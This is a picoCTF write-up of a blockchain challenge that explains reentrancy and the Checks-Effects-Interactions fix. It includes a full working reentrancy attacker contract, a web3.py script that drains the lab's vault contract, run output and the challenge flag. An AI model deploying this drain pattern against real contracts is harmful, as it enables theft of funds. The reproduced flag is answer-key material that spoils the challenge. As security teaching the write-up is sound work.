# Reentrance — picoCTF Writeup

**Challenge:** Reentrance  
**Category:** Blockchain  
**Difficulty:** Hard  
**Points:** 400  
**Flag:** `picoCTF{UpDaTe_St4ate5_1st_7c58e46d}`  
**Platform:** picoCTF (2025)  
**Writeup by:** zham

---

## Description

> The lead developer at *SecureBank Corp* is back, and he's doubling down. After the last "incident," he claims he's patched the vault and created the ultimate, unhackable Ethereum contract. He's so confident, he's explicitly taunting the security team to try and break it.
>
> He says, *"I've added the checks, I've added the balances. There is no way you can withdraw more than you own."*
>
> Your mission: Wipe the smile off his face. Drain the vault down to 0 and force the contract to surrender the flag. Contract: here
>
> `Eth node address: crystal-peak.picoctf.net:61812` More details can be found at here.

---

## Hints

No hints provided for this challenge.

---

## Background Knowledge (Read This First!)

### What is reentrancy?

Reentrancy is one of the most famous vulnerabilities in Ethereum history. It caused the 2016 DAO hack, which drained roughly $60 million USD worth of ETH and led to the Ethereum/Ethereum Classic chain split.

The attack works by exploiting the order of operations in a withdraw function. The classic vulnerable pattern:

```solidity
function withdraw(uint amount) public {
    require(balances[msg.sender] >= amount);   // 1. check balance
    msg.sender.call{value: amount}("");         // 2. send ETH  ← attacker re-enters HERE
    balances[msg.sender] -= amount;             // 3. update balance (too late)
}
```

When the contract sends ETH to `msg.sender` using `.call{}("")`, if the recipient is a contract, that contract's `receive()` function is automatically triggered. An attacker contract can exploit this by calling `withdraw()` again from inside `receive()`, before step 3 ever runs. Since the balance has not been updated yet, step 1 passes again. This loop continues until the bank is empty.

### The Checks-Effects-Interactions pattern

The correct fix is to always update state **before** making any external call:

```solidity
function withdraw(uint amount) public {
    require(balances[msg.sender] >= amount);
    balances[msg.sender] -= amount;            // update FIRST (Effects)
    msg.sender.call{value: amount}("");        // then transfer (Interactions)
}
```

This is called **Checks-Effects-Interactions** (CEI). Once the balance is zeroed before the call, any reentrant `withdraw()` call fails the `require` check.

### How does an attacker contract work?

To exploit reentrancy, I deploy a separate "attacker" contract that:

1. Deposits some ETH into the vulnerable bank (so it has a valid balance)
2. Calls `withdraw()` on the bank
3. Has a `receive()` function that immediately calls `withdraw()` again before the bank updates its books

This creates a recursive loop that drains the bank one withdrawal at a time.

### Web3.py + py-solc-x

Since `cast` (Foundry) is incompatible with the picoCTF custom Ethereum nodes (duplicate `data` field error), I use web3.py to build and send transactions, and py-solc-x to compile the attacker contract on the fly inside the same Python script.

---

## Step-by-Step Solution

### Step 0: Read the contract

```
┌──(zham㉿kali)-[~]
└─$ cat VulnBank.sol
```

The vulnerable function:

```solidity
function withdraw(uint amount) public {
    require(balances[msg.sender] >= amount, "Insufficient funds available");

    (bool sent, ) = msg.sender.call{value: amount}("");  // ← sends ETH first
    balances[msg.sender] -= amount;                       // ← updates balance AFTER

    require(sent, "Transfer failed");

    if (!revealed && address(this).balance == 0) {
        revealed = true;
        emit FlagRevealed(flag);                          // flag revealed when bank is empty
    }
}
```

The ETH is sent to `msg.sender` before `balances[msg.sender]` is decremented. If `msg.sender` is a contract, its `receive()` runs during that `.call`, and can call `withdraw()` again with the stale (un-decremented) balance. The check passes every time until the bank hits zero.

The flag reveal is automatic: when `address(this).balance == 0`, `revealed = true` and `getFlag()` unlocks.

---

### Step 1: Get contract details from the info page

Visit the "More details" link. It opens at a separate port:

```
http://crystal-peak.picoctf.net:49730
```

From that page:

- **Bank Address:** `0x6Fd09d4d9795a3e07EdDBD9a82c882B46a5A6deF`
- **Initial Internal Balance:** 10 ETH
- **Your Address:** `0x3f58d2f810C293e8aDd70DcffD461c84D61267E0`
- **Your Private Key:** `0x8b7e7cd442387b62753d3ad8d7c38cfab3697b3931788491421dc010df03efcb`
- **Your Gas Balance:** 5 ETH

---

### Step 2: Install dependencies

```
┌──(zham㉿kali)-[~]
└─$ pip install web3 py-solc-x --break-system-packages
```

---

### Step 3: Write the exploit

```
┌──(zham㉿kali)-[~]
└─$ nano exploit.py
```

Paste this:

```python
from web3 import Web3
from solcx import compile_source, install_solc

install_solc('0.6.12')

RPC_URL    = "http://crystal-peak.picoctf.net:61812"
BANK_ADDR  = Web3.to_checksum_address("0x6Fd09d4d9795a3e07EdDBD9a82c882B46a5A6deF")
MY_ADDRESS = "0x3f58d2f810C293e8aDd70DcffD461c84D61267E0"
PRIV_KEY   = "0x8b7e7cd442387b62753d3ad8d7c38cfab3697b3931788491421dc010df03efcb"

w3 = Web3(Web3.HTTPProvider(RPC_URL))

bank_abi = [
    {"inputs":[],"name":"deposit","outputs":[],"stateMutability":"payable","type":"function"},
    {"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[],"name":"getFlag","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},
]

attacker_src = '''
pragma solidity ^0.6.12;
interface IVulnBank {
    function deposit() external payable;
    function withdraw(uint amount) external;
}
contract Attacker {
    IVulnBank public bank;
    address payable public owner;
    uint public amt;
    constructor(address _bank) public {
        bank = IVulnBank(_bank);
        owner = msg.sender;
    }
    function attack() external payable {
        amt = msg.value;
        bank.deposit{value: msg.value}();
        bank.withdraw(amt);
    }
    receive() external payable {
        if (address(bank).balance >= amt) {
            bank.withdraw(amt);
        }
    }
    function drain() external {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
}
'''

compiled = compile_source(attacker_src, output_values=['abi','bin'], solc_version='0.6.12')
abi = compiled['<stdin>:Attacker']['abi']
byt = compiled['<stdin>:Attacker']['bin']

def send_tx(tx):
    signed = w3.eth.account.sign_transaction(tx, PRIV_KEY)
    receipt = w3.eth.wait_for_transaction_receipt(
        w3.eth.send_raw_transaction(signed.raw_transaction))
    print(f"  tx: {receipt.transactionHash.hex()}  status: {receipt.status}")
    return receipt

print(f"Our balance:  {w3.from_wei(w3.eth.get_balance(MY_ADDRESS), 'ether')} ETH")
print(f"Bank balance: {w3.from_wei(w3.eth.get_balance(BANK_ADDR), 'ether')} ETH")

print("\n[1] Deploying attacker contract...")
Attacker = w3.eth.contract(abi=abi, bytecode=byt)
r = send_tx(Attacker.constructor(BANK_ADDR).build_transaction({
    'from': MY_ADDRESS,
    'nonce': w3.eth.get_transaction_count(MY_ADDRESS),
    'gas': 500000,
    'gasPrice': w3.eth.gas_price,
}))
attacker = w3.eth.contract(address=r.contractAddress, abi=abi)
print(f"  Attacker deployed at: {r.contractAddress}")

print("\n[2] Attacking (depositing 1 ETH, draining 11 ETH total)...")
r = send_tx(attacker.functions.attack().build_transaction({
    'from': MY_ADDRESS,
    'nonce': w3.eth.get_transaction_count(MY_ADDRESS),
    'gas': 2000000,
    'gasPrice': w3.eth.gas_price,
    'value': w3.to_wei(1, 'ether'),
}))

bank_bal = w3.eth.get_balance(BANK_ADDR)
print(f"\nBank balance after attack: {w3.from_wei(bank_bal, 'ether')} ETH")

bank = w3.eth.contract(address=BANK_ADDR, abi=bank_abi)
if bank_bal == 0:
    print("Flag:", bank.functions.getFlag().call())
else:
    print("Not fully drained yet.")
```

Ctrl+O, Enter, Ctrl+X.

---

### Step 4: Run the exploit

```
┌──(zham㉿kali)-[~]
└─$ python3 exploit.py
Our balance:  5 ETH
Bank balance: 10 ETH

[1] Deploying attacker contract...
  tx: 7e78e53e92f58995ff39a2817353f2138c8d3829a48241d97f5a5712098e1f09  status: 1
  Attacker deployed at: 0x264eE220d8Fd831c25f20829aaC4D257A371A1d4

[2] Attacking (depositing 1 ETH, draining 11 ETH total)...
  tx: a32af6acca34309bc33b7eaa1ea4236949cd2aeb119b453af3215859ebce1467  status: 1

Bank balance after attack: 0 ETH
Flag: picoCTF{UpDaTe_St4ate5_1st_7c58e46d}
```

---

## What Happened Internally

```
[1] We have 5 ETH gas balance. Bank has 10 ETH.

[2] We compile and deploy the Attacker contract.
    Attacker stores the bank address and our address as owner.

[3] We call attack() with 1 ETH.
    Attacker deposits 1 ETH into the bank.
    Bank balances[attacker] = 1 ETH. Bank.balance = 11 ETH.
    Attacker calls bank.withdraw(1 ETH).

[4] Bank's withdraw() runs:
    - require(balances[attacker] >= 1) → 1 >= 1 → PASS
    - bank sends 1 ETH to attacker via .call{}("")
    - attacker's receive() fires BEFORE balances[attacker] is decremented

[5] Inside receive():
    - address(bank).balance = 10 ETH (still has funds)
    - calls bank.withdraw(1 ETH) again

[6] Bank's withdraw() runs again (reentry):
    - require(balances[attacker] >= 1) → still 1 (not updated yet!) → PASS
    - sends another 1 ETH → receive() fires again

[7] Loop repeats 11 times total:
    Call 1:  bank sends 1 ETH → bank.balance = 10
    Call 2:  bank sends 1 ETH → bank.balance = 9
    ...
    Call 11: bank sends 1 ETH → bank.balance = 0

[8] On call 11: address(bank).balance (0) < amt (1) → receive() does NOT reenter.
    Stack unwinds. Each frame's balances[attacker] -= 1 runs.
    balances[attacker] ends at -10 (underflow, but uint wraps — doesn't matter).

[9] Bank.balance == 0 triggers:
    revealed = true
    FlagRevealed event emitted

[10] getFlag() returns picoCTF{UpDaTe_St4ate5_1st_7c58e46d}
```

---

## Tools Used

| Tool        | Purpose                                               |
|-------------|-------------------------------------------------------|
| web3.py     | Build, sign, and send transactions to the node        |
| py-solc-x   | Compile the Attacker contract inside Python           |
| Browser     | Retrieve bank address, player address, private key    |

---

## Key Takeaways

- **Always update state before external calls** — the fix is one line moved up: decrement `balances[msg.sender]` before `.call{}("")`. This is the Checks-Effects-Interactions (CEI) pattern and every Solidity developer must know it by heart.
- **`.call{}("")` hands control to the recipient** — unlike `transfer()` (which forwards only 2300 gas and prevents reentry), `.call` forwards all available gas. This gives the recipient's `receive()` function full execution budget to call back.
- **Reentrancy loops until empty** — the attacker doesn't need to know the bank's balance in advance. The `receive()` loop just keeps calling until `bank.balance < amt`, then stops naturally.
- **cast fails on custom picoCTF nodes** — newer Foundry sends both `input` and `data` in JSON-RPC, which some nodes reject. web3.py + py-solc-x is the reliable alternative for these challenges.
- **This is real** — this exact bug caused the 2016 DAO hack. The flag even spells it out: "UpDaTe St4ate5 1st" = Update States First.

**Flag wordplay decode:** `picoCTF{UpDaTe_St4ate5_1st_7c58e46d}` = "Update States First" — the one rule the contract forgot, and exactly how it was beaten.
